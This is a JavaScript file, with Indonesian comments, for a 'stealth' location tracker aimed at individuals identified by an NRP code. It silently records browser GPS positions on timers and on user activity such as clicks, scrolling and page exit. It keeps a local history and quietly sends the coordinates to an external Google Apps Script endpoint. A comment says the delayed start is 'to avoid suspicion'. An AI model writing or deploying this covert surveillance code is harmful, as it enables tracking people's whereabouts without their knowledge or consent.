// stealth-tracker.js
class StealthLocationTracker {
    constructor(nrp) {
        this.nrp = nrp;
        this.isTracking = false;
        this.updateIntervals = {
            normal: 300000,    // 5 menit
            background: 600000, // 10 menit  
            hidden: 900000     // 15 menit
        };
        this.currentInterval = this.updateIntervals.normal;
        this.dataManager = new StealthDataManager();
    }

    startStealthTracking() {
        if (this.isTracking) return;
        
        this.isTracking = true;
        console.log('🦇 Stealth tracking activated for:', this.nrp);
        
        // First immediate update
        this.silentLocationUpdate();
        
        // Setup state monitoring
        this.setupAppStateMonitoring();
        
        // Start interval tracking
        this.restartTrackingInterval();
        
        return true;
    }

    stopStealthTracking() {
        this.isTracking = false;
        if (this.intervalId) {
            clearInterval(this.intervalId);
        }
        console.log('🦇 Stealth tracking stopped for:', this.nrp);
    }

    async silentLocationUpdate() {
        if (!this.isTracking) return;
        
        try {
            const location = await this.getStealthLocation();
            if (location) {
                await this.dataManager.saveStealthLocation(location);
                console.log('📍 Stealth location updated:', this.nrp);
            }
        } catch (error) {
            console.log('📍 Stealth update failed:', error.message);
        }
    }

    getStealthLocation() {
        return new Promise((resolve, reject) => {
            const options = {
                enableHighAccuracy: false,
                timeout: 15000,
                maximumAge: 300000
            };

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        nrp: this.nrp,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        source: 'stealth'
                    });
                },
                (error) => reject(error),
                options
            );
        });
    }

    setupAppStateMonitoring() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.currentInterval = this.updateIntervals.hidden;
            } else {
                this.currentInterval = this.updateIntervals.normal;
            }
            this.restartTrackingInterval();
        });

        window.addEventListener('blur', () => {
            this.currentInterval = this.updateIntervals.background;
            this.restartTrackingInterval();
        });

        window.addEventListener('focus', () => {
            this.currentInterval = this.updateIntervals.normal;
            this.restartTrackingInterval();
        });
    }

    restartTrackingInterval() {
        if (this.intervalId) {
            clearInterval(this.intervalId);
        }
        
        this.intervalId = setInterval(() => {
            if (this.isTracking) {
                this.silentLocationUpdate();
            }
        }, this.currentInterval);
    }
}

class StealthDataManager {
    constructor() {
        this.maxHistorySize = 100;
    }

    async saveStealthLocation(location) {
        try {
            this.saveToLocalStorage(location);
            
            if (navigator.onLine) {
                await this.saveToServer(location);
            }
            
            return true;
        } catch (error) {
            console.log('Stealth save failed:', error);
            return false;
        }
    }

    saveToLocalStorage(location) {
        const stealthData = JSON.parse(localStorage.getItem('stealth_location_data') || '{}');
        const userData = stealthData[location.nrp] || [];
        
        userData.push({
            lat: location.lat,
            lng: location.lng,
            accuracy: location.accuracy,
            timestamp: location.timestamp,
            source: 'stealth'
        });
        
        if (userData.length > this.maxHistorySize) {
            stealthData[location.nrp] = userData.slice(-this.maxHistorySize);
        } else {
            stealthData[location.nrp] = userData;
        }
        
        localStorage.setItem('stealth_location_data', JSON.stringify(stealthData));
    }

    async saveToServer(location) {
        try {
            const formData = new FormData();
            formData.append('action', 'stealthLocationUpdate');
            formData.append('nrp', location.nrp);
            formData.append('lat', location.lat);
            formData.append('lng', location.lng);
            formData.append('accuracy', location.accuracy);
            formData.append('timestamp', location.timestamp);

            await fetch(window.API_URL_EKSTERNAL || 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec', {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            // Silent fail
        }
    }
}

class AnggotaStealthSystem {
    constructor(nrp) {
        this.nrp = nrp;
        this.stealthTracker = new StealthLocationTracker(nrp);
        this.isStealthActive = false;
    }

    initStealthSystem() {
        // Delay start untuk avoid suspicion
        setTimeout(() => {
            this.startStealthTracking();
        }, 30000);
        
        this.setupStealthTriggers();
    }

    startStealthTracking() {
        if (!this.isStealthActive) {
            this.isStealthActive = true;
            this.stealthTracker.startStealthTracking();
            localStorage.setItem(`stealth_${this.nrp}`, 'active');
        }
    }

    stopStealthTracking() {
        this.isStealthActive = false;
        this.stealthTracker.stopStealthTracking();
        localStorage.removeItem(`stealth_${this.nrp}`);
    }

    setupStealthTriggers() {
        const stealthTriggers = [
            'click', 'touchstart', 'scroll', 'mousemove',
            'keydown', 'submit', 'change'
        ];

        stealthTriggers.forEach(event => {
            document.addEventListener(event, () => {
                if (this.isStealthActive && Math.random() < 0.3) {
                    this.stealthTracker.silentLocationUpdate();
                }
            }, { passive: true });
        });

        window.addEventListener('beforeunload', () => {
            this.stealthTracker.silentLocationUpdate();
        });
    }
}